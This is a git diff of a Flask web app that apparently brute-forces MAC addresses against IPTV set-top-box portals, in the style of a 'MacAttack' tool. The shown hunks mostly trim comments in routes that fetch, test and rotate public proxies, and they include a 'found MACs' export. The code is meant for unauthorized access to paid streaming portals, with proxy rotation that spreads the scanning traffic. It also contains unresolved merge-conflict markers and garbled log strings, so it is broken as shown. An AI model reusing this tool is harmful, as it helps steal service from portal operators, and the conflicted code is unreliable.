     add_log(state, f"Ã¢Åâ Finished. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")
 
 
 def test_mac_worker(portal_url, mac, proxy, timeout):
+<<<<<<< Updated upstream
     """Worker using optimized stb.test_mac_full() with settings."""
     settings = get_settings()
     max_retries = settings.get("session_max_retries", 0)
     return stb.test_mac_full(portal_url, mac, proxy, timeout, max_retries=max_retries)
+=======
+    """Test MAC using quick scan + full scan."""
+    return stb.test_mac_full(portal_url, mac, proxy, timeout)
+>>>>>>> Stashed changes
 
 
-# ============== PROXY ROUTES WITH CUSTOM SOURCES ==============
+
+# ============== PROXY ROUTES ==============
 
 @app.route("/api/proxies", methods=["GET", "POST", "DELETE"])
 @requires_auth
@@ -985,7 +1416,6 @@ def api_proxies():
         data = request.json
         proxies = data.get("proxies", "").strip().split("\n")
         proxies = [p.strip() for p in proxies if p.strip()]
-        # Remove duplicates while preserving order
         seen = set()
         unique_proxies = []
         for p in proxies:
@@ -1006,7 +1436,6 @@ def api_proxies():
 @app.route("/api/proxies/sources", methods=["GET", "POST"])
 @requires_auth
 def api_proxy_sources():
-    """Manage custom proxy sources."""
     if request.method == "GET":
         return jsonify({"sources": config.get("proxy_sources", DEFAULT_PROXY_SOURCES)})
     
@@ -1063,22 +1492,18 @@ def api_proxies_status():
 @app.route("/api/proxies/reset-errors", methods=["POST"])
 @requires_auth
 def api_proxies_reset_errors():
-    """Reset proxy error counts."""
-    global proxy_error_counts, proxy_error_connect_counts
+    global proxy_error_counts
     proxy_error_counts.clear()
-    proxy_error_connect_counts.clear()
     return jsonify({"success": True})
 
 
 @app.route("/api/proxies/remove-failed", methods=["POST"])
 @requires_auth
 def api_proxies_remove_failed():
-    """Remove failed proxies from the list."""
     failed = proxy_state.get("failed_proxies", [])
     if not failed:
         return jsonify({"success": False, "error": "No failed proxies to remove. Run 'Test Proxies' first."})
     
-    # Use set for O(1) lookup instead of O(n) list lookup
     failed_set = set(failed)
     current = config.get("proxies", [])
     remaining = [p for p in current if p not in failed_set]
@@ -1095,7 +1520,6 @@ def api_proxies_remove_failed():
 @app.route("/api/proxies/test-autodetect", methods=["POST"])
 @requires_auth
 def api_proxies_test_autodetect():
-    """Test proxies with auto-detection of type (HTTP -> SOCKS5 -> SOCKS4)."""
     global proxy_state
     
     if proxy_state["testing"]:
@@ -1111,7 +1535,6 @@ def api_proxies_test_autodetect():
 
 
 def fetch_proxies_worker():
-    """Fetch proxies from all sources including custom ones."""
     global proxy_state
     
     sources = config.get("proxy_sources", DEFAULT_PROXY_SOURCES)
@@ -1136,18 +1559,13 @@ def fetch_proxies_worker():
                     )
                     all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                 else:
-                    # Generic parsing - try multiple formats
-                    # 1. Try HTML table format
                     matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", response.text)
                     if matches:
                         all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                     else:
-                        # 2. Try to find proxies with prefixes (socks5://, socks4://, http://)
                         prefixed = re.findall(r"((?:socks[45]|http)://[^\s<>\"']+)", response.text, re.IGNORECASE)
                         if prefixed:
                             all_proxies.extend(prefixed)
-                        
-                        # 3. Try plain ip:port format
                         plain = re.findall(r"(\d+\.\d+\.\d+\.\d+:\d+)", response.text)
                         all_proxies.extend(plain)
                 
@@ -1155,17 +1573,14 @@ def fetch_proxies_worker():
         except Exception as e:
             add_log(proxy_state, f"Error fetching from {source}: {e}", "error")
     
-    # Remove duplicates
     all_proxies = list(set(all_proxies))
-    
     proxy_state["proxies"] = all_proxies
     
-    add_log(proxy_state, f"Total unique proxies: {len(all_proxies)}. Use 'Test & Auto-Detect' to determine proxy types.", "success")
+    add_log(proxy_state, f"Total unique proxies: {len(all_proxies)}. Use 'Test & Auto-Detect' to verify.", "success")
     proxy_state["fetching"] = False
 
 
 def test_proxies_worker():
-    """Test proxies for validity - supports HTTP, SOCKS4, SOCKS5. Does NOT remove failed proxies."""
     global proxy_state
     
     proxies = config.get("proxies", [])
@@ -1186,11 +1601,7 @@ def test_proxies_worker():
         try:
             with no_proxy_environment():
                 proxy_dict = stb.parse_proxy(proxy)
-                response = requests.get(
-                    "http://httpbin.org/ip",
-                    proxies=proxy_dict,
-                    timeout=10
-                )
+                response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
                 if response.status_code == 200:
                     return proxy, True
         except:
@@ -1211,15 +1622,13 @@ def test_proxies_worker():
     
     proxy_state["working_proxies"] = working
     proxy_state["failed_proxies"] = failed
-    # Don't remove failed proxies automatically - user can use "Remove Failed" button
-    proxy_state["proxies"] = proxies  # Keep all proxies in state
+    proxy_state["proxies"] = proxies
     
-    add_log(proxy_state, f"Done! {len(working)}/{len(proxies)} working. Use 'Remove Failed' to delete non-working proxies.", "success")
+    add_log(proxy_state, f"Done! {len(working)}/{len(proxies)} working.", "success")
     proxy_state["testing"] = False
 
 
 def test_proxies_autodetect_worker():
-    """Test proxies and auto-detect type (HTTP -> SOCKS5 -> SOCKS4)."""
     global proxy_state
     
     proxies = config.get("proxies", [])
@@ -1237,12 +1646,10 @@ def test_proxies_autodetect_worker():
     add_log(proxy_state, f"Testing {len(proxies)} proxies with {test_threads} threads (HTTP â SOCKS5 â SOCKS4)...", "info")
     
     def test_proxy_autodetect(proxy):
-        # Extract base ip:port and auth (remove any existing prefix)
         original_proxy = proxy
         base_proxy = proxy
         auth_part = ""
         
-        # Remove prefix
         if proxy.startswith("socks5://"):
             base_proxy = proxy[9:]
         elif proxy.startswith("socks4://"):
@@ -1250,36 +1657,22 @@ def test_proxies_autodetect_worker():
         elif proxy.startswith("http://"):
             base_proxy = proxy[7:]
         
-        # Extract auth if present (user:pass@ip:port)
         if "@" in base_proxy:
             auth_part, base_proxy = base_proxy.rsplit("@", 1)
             auth_part = auth_part + "@"
         
-        # Test order: HTTP (with auth), HTTP (without auth), SOCKS5, SOCKS4
         test_configs = []
-        
-        # HTTP with auth if auth exists
         if auth_part:
             test_configs.append((f"http://{auth_part}{base_proxy}", "HTTP", f"http://{auth_part}{base_proxy}"))
-        
-        # HTTP without auth (or plain ip:port)
         test_configs.append((base_proxy, "HTTP", base_proxy))
-        
-        # SOCKS5 with auth
         test_configs.append((f"socks5://{auth_part}{base_proxy}", "SOCKS5", f"socks5://{auth_part}{base_proxy}"))
-        
-        # SOCKS4 (doesn't support auth)
         test_configs.append((f"socks4://{base_proxy}", "SOCKS4", f"socks4://{base_proxy}"))
         
         for test_proxy_str, proxy_type, result_proxy in test_configs:
             try:
                 with no_proxy_environment():
                     proxy_dict = stb.parse_proxy(test_proxy_str)
-                    response = requests.get(
-                        "http://httpbin.org/ip",
-                        proxies=proxy_dict,
-                        timeout=10
-                    )
+                    response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
                     if response.status_code == 200:
                         return original_proxy, result_proxy, proxy_type, True
             except:
@@ -1300,19 +1693,22 @@ def test_proxies_autodetect_worker():
                     add_log(proxy_state, f"â {detected} ({proxy_type})", "success")
             else:
                 failed.append(original)
+<<<<<<< Updated upstream
                 add_log(proxy_state, f"â {original} (no working type found)", "error")
+=======
+                add_log(proxy_state, f"✗ {original}", "error")
+>>>>>>> Stashed changes
     
-    # Update proxies with detected types
     proxy_state["working_proxies"] = result_proxies
     proxy_state["failed_proxies"] = failed
-    proxy_state["proxies"] = result_proxies + failed  # Keep all but update working ones
+    proxy_state["proxies"] = result_proxies + failed
     
-    # Save the updated proxies (with correct types)
     config["proxies"] = result_proxies + failed
     save_config()
     
-    add_log(proxy_state, f"Done! {len(result_proxies)}/{len(proxies)} working. Types auto-detected and updated.", "success")
+    add_log(proxy_state, f"Done! {len(result_proxies)}/{len(proxies)} working. Types auto-detected.", "success")
     proxy_state["testing"] = False
+
 
 
 # ============== PLAYER ROUTES ==============
@@ -1418,7 +1814,6 @@ def api_found():
 @app.route("/api/found/export")
 @requires_auth
 def api_found_export():
-    """Export found MACs - like original MacAttack output format."""
     format_type = request.args.get("format", "txt")
     found = config.get("found_macs", [])
     
@@ -1429,7 +1824,6 @@ def api_found_export():
             headers={"Content-Disposition": "attachment;filename=found_macs.json"}
         )
     else:
-        # Format like original MacAttack
         lines = []
         for m in found:
             line = f"{'Portal:':<10} {m.get('portal', 'N/A')}\n"
